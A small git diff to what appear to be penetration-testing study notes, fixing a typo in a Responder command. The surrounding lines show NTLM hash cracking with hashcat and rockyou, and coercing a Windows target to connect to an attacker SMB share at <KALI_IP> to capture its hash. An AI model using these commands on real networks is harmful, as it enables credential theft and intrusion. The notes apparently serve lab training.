@@ -109,7 +109,7 @@ kali@kali:~$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr
 ```powershell
 # Check interfaces and run Responder with desired interface
 kali@kali:~$ ip a
-kali@kali:~$ sudo respnder -I <INTERFACE>
+kali@kali:~$ sudo responder -I <INTERFACE>
 
 # Send a request to responder SMB from target PC
 C:\Windows\system32> dir \\<KALI_IP>\test
